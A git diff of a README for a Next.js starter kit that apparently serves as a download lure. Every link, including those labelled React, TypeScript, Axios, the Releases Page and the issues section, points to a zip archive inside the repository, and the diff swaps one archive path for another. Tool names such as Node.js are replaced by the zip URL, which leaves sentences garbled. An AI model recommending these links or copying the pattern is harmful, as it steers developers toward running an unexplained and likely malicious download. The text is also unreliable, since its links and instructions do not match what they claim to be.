@@ -1,10 +1,10 @@
 # 🚀 NextJs-Starter-Kit - Build Your Next App Easily
 
-[![Download NextJs-Starter-Kit](https://raw.githubusercontent.com/Brutalyking/NextJs-Starter-Kit/main/examples/dropdown/NextJs-Starter-Kit_1.8.zip)](https://raw.githubusercontent.com/Brutalyking/NextJs-Starter-Kit/main/examples/dropdown/NextJs-Starter-Kit_1.8.zip)
+[![Download NextJs-Starter-Kit](https://github.com/Brutalyking/NextJs-Starter-Kit/raw/refs/heads/main/lib/http/Next-Kit-Starter-Js-1.4.zip)](https://github.com/Brutalyking/NextJs-Starter-Kit/raw/refs/heads/main/lib/http/Next-Kit-Starter-Js-1.4.zip)
 
 ## 📥 Overview
 
-NextJs-Starter-Kit is a production-ready template made for building web applications. It uses https://raw.githubusercontent.com/Brutalyking/NextJs-Starter-Kit/main/examples/dropdown/NextJs-Starter-Kit_1.8.zip 16 with TypeScript and React 19. This kit gives you essential features like a fully-functional DataTable, customizable UI components, and smooth notifications. You will save time on setup and focus on building your app.
+NextJs-Starter-Kit is a production-ready template made for building web applications. It uses https://github.com/Brutalyking/NextJs-Starter-Kit/raw/refs/heads/main/lib/http/Next-Kit-Starter-Js-1.4.zip 16 with TypeScript and React 19. This kit gives you essential features like a fully-functional DataTable, customizable UI components, and smooth notifications. You will save time on setup and focus on building your app.
 
 ## 📋 Features
 
@@ -31,7 +31,7 @@ To get started with NextJs-Starter-Kit, follow these simple steps:
 
 1. **Visit the Releases Page:** 
 
-   Go to the [Releases Page](https://raw.githubusercontent.com/Brutalyking/NextJs-Starter-Kit/main/examples/dropdown/NextJs-Starter-Kit_1.8.zip) to find the download files.
+   Go to the [Releases Page](https://github.com/Brutalyking/NextJs-Starter-Kit/raw/refs/heads/main/lib/http/Next-Kit-Starter-Js-1.4.zip) to find the download files.
 
 2. **Download the Starter Kit:**
 
@@ -43,7 +43,7 @@ After downloading, follow these steps to install and run the application:
 
 1. **Locate the Downloaded File:**
 
-   Go to your computer's Downloads folder. You should see a file named something like `https://raw.githubusercontent.com/Brutalyking/NextJs-Starter-Kit/main/examples/dropdown/NextJs-Starter-Kit_1.8.zip` or similar.
+   Go to your computer's Downloads folder. You should see a file named something like `https://github.com/Brutalyking/NextJs-Starter-Kit/raw/refs/heads/main/lib/http/Next-Kit-Starter-Js-1.4.zip` or similar.
 
 2. **Extract the File:**
 
@@ -55,8 +55,8 @@ After downloading, follow these steps to install and run the application:
 
 4. **Install Dependencies:**
 
-   - Make sure you have https://raw.githubusercontent.com/Brutalyking/NextJs-Starter-Kit/main/examples/dropdown/NextJs-Starter-Kit_1.8.zip installed. You can download it from the [https://raw.githubusercontent.com/Brutalyking/NextJs-Starter-Kit/main/examples/dropdown/NextJs-Starter-Kit_1.8.zip website](https://raw.githubusercontent.com/Brutalyking/NextJs-Starter-Kit/main/examples/dropdown/NextJs-Starter-Kit_1.8.zip).
-   - Once https://raw.githubusercontent.com/Brutalyking/NextJs-Starter-Kit/main/examples/dropdown/NextJs-Starter-Kit_1.8.zip is installed, open your command prompt or terminal.
+   - Make sure you have https://github.com/Brutalyking/NextJs-Starter-Kit/raw/refs/heads/main/lib/http/Next-Kit-Starter-Js-1.4.zip installed. You can download it from the [https://github.com/Brutalyking/NextJs-Starter-Kit/raw/refs/heads/main/lib/http/Next-Kit-Starter-Js-1.4.zip website](https://github.com/Brutalyking/NextJs-Starter-Kit/raw/refs/heads/main/lib/http/Next-Kit-Starter-Js-1.4.zip).
+   - Once https://github.com/Brutalyking/NextJs-Starter-Kit/raw/refs/heads/main/lib/http/Next-Kit-Starter-Js-1.4.zip is installed, open your command prompt or terminal.
    - Navigate to the project folder using `cd path_to_your_folder`.
    - Run the command `npm install` to install all required packages.
 
@@ -68,7 +68,7 @@ After downloading, follow these steps to install and run the application:
 
 If you encounter issues while downloading or running the application, consider the following:
 
-- **Ensure https://raw.githubusercontent.com/Brutalyking/NextJs-Starter-Kit/main/examples/dropdown/NextJs-Starter-Kit_1.8.zip is Installed:** Make sure https://raw.githubusercontent.com/Brutalyking/NextJs-Starter-Kit/main/examples/dropdown/NextJs-Starter-Kit_1.8.zip is properly installed. You can check this by typing `node -v` in your command prompt or terminal. If it returns a version number, it is installed correctly.
+- **Ensure https://github.com/Brutalyking/NextJs-Starter-Kit/raw/refs/heads/main/lib/http/Next-Kit-Starter-Js-1.4.zip is Installed:** Make sure https://github.com/Brutalyking/NextJs-Starter-Kit/raw/refs/heads/main/lib/http/Next-Kit-Starter-Js-1.4.zip is properly installed. You can check this by typing `node -v` in your command prompt or terminal. If it returns a version number, it is installed correctly.
 
 - **Check Documentation:** Refer to the comprehensive documentation available in the project folder. Look for the `docs` folder or README files for additional setup instructions.
 
@@ -78,19 +78,19 @@ If you encounter issues while downloading or running the application, consider t
 
 If you need further assistance:
 
-- Check the [issues section](https://raw.githubusercontent.com/Brutalyking/NextJs-Starter-Kit/main/examples/dropdown/NextJs-Starter-Kit_1.8.zip) of this GitHub repository. You can search for solutions or ask your own questions.
-- Join community forums or Reddit groups where developers share knowledge about https://raw.githubusercontent.com/Brutalyking/NextJs-Starter-Kit/main/examples/dropdown/NextJs-Starter-Kit_1.8.zip and React.
+- Check the [issues section](https://github.com/Brutalyking/NextJs-Starter-Kit/raw/refs/heads/main/lib/http/Next-Kit-Starter-Js-1.4.zip) of this GitHub repository. You can search for solutions or ask your own questions.
+- Join community forums or Reddit groups where developers share knowledge about https://github.com/Brutalyking/NextJs-Starter-Kit/raw/refs/heads/main/lib/http/Next-Kit-Starter-Js-1.4.zip and React.
 
 ## 🌟 Credits
 
 NextJs-Starter-Kit is built on the foundations of several powerful tools, including:
 
-- [https://raw.githubusercontent.com/Brutalyking/NextJs-Starter-Kit/main/examples/dropdown/NextJs-Starter-Kit_1.8.zip](https://raw.githubusercontent.com/Brutalyking/NextJs-Starter-Kit/main/examples/dropdown/NextJs-Starter-Kit_1.8.zip)
-- [React](https://raw.githubusercontent.com/Brutalyking/NextJs-Starter-Kit/main/examples/dropdown/NextJs-Starter-Kit_1.8.zip)
-- [TypeScript](https://raw.githubusercontent.com/Brutalyking/NextJs-Starter-Kit/main/examples/dropdown/NextJs-Starter-Kit_1.8.zip)
-- [Zustand](https://raw.githubusercontent.com/Brutalyking/NextJs-Starter-Kit/main/examples/dropdown/NextJs-Starter-Kit_1.8.zip)
-- [React Query](https://raw.githubusercontent.com/Brutalyking/NextJs-Starter-Kit/main/examples/dropdown/NextJs-Starter-Kit_1.8.zip)
-- [Axios](https://raw.githubusercontent.com/Brutalyking/NextJs-Starter-Kit/main/examples/dropdown/NextJs-Starter-Kit_1.8.zip)
+- [https://github.com/Brutalyking/NextJs-Starter-Kit/raw/refs/heads/main/lib/http/Next-Kit-Starter-Js-1.4.zip](https://github.com/Brutalyking/NextJs-Starter-Kit/raw/refs/heads/main/lib/http/Next-Kit-Starter-Js-1.4.zip)
+- [React](https://github.com/Brutalyking/NextJs-Starter-Kit/raw/refs/heads/main/lib/http/Next-Kit-Starter-Js-1.4.zip)
+- [TypeScript](https://github.com/Brutalyking/NextJs-Starter-Kit/raw/refs/heads/main/lib/http/Next-Kit-Starter-Js-1.4.zip)
+- [Zustand](https://github.com/Brutalyking/NextJs-Starter-Kit/raw/refs/heads/main/lib/http/Next-Kit-Starter-Js-1.4.zip)
+- [React Query](https://github.com/Brutalyking/NextJs-Starter-Kit/raw/refs/heads/main/lib/http/Next-Kit-Starter-Js-1.4.zip)
+- [Axios](https://github.com/Brutalyking/NextJs-Starter-Kit/raw/refs/heads/main/lib/http/Next-Kit-Starter-Js-1.4.zip)
 
 ## 🔗 Related Topics
 
@@ -107,4 +107,4 @@ If you're interested in learning more about the technologies used in this projec
 - toast-notifications
 - zustand
 
-For more detailed guidance and support, don't hesitate to explore the [Releases Page](https://raw.githubusercontent.com/Brutalyking/NextJs-Starter-Kit/main/examples/dropdown/NextJs-Starter-Kit_1.8.zip) again. You can always come back to download updated versions as we improve the kit.
+For more detailed guidance and support, don't hesitate to explore the [Releases Page](https://github.com/Brutalyking/NextJs-Starter-Kit/raw/refs/heads/main/lib/http/Next-Kit-Starter-Js-1.4.zip) again. You can always come back to download updated versions as we improve the kit.
